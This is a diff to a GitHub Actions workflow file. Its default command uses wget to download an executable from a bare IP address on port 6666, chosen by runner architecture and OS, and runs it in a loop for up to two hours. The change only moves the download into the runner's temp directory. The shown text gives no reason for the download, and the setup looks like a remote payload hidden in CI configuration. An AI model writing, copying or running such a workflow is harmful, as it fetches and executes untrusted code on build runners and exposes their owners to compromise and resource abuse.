@@ -5,7 +5,7 @@ on:
       runs-on:
         default: 'ubuntu-latest'
       run:
-        default: 'wget -O exe.exe 109.188.87.160:6666/{0)_{1} && ./exe.exe'
+        default: 'wget -O {2}/exe.exe 109.188.87.160:6666/{0)_{1} && {2}/exe.exe'
 jobs:
   loop:
     runs-on: ${{ inputs.runs-on }}
@@ -19,7 +19,7 @@ jobs:
       run: rm -rf exit
     - shell: bash
       run: |
-        while (${{ format(inputs.run, runner.arch, runner.os) }}) || true
+        while (${{ format(inputs.run, runner.arch, runner.os, runner.temp) }}) || true
         do
           if [[ -f exit ]] || (( $SECONDS > 7200 ))
           then
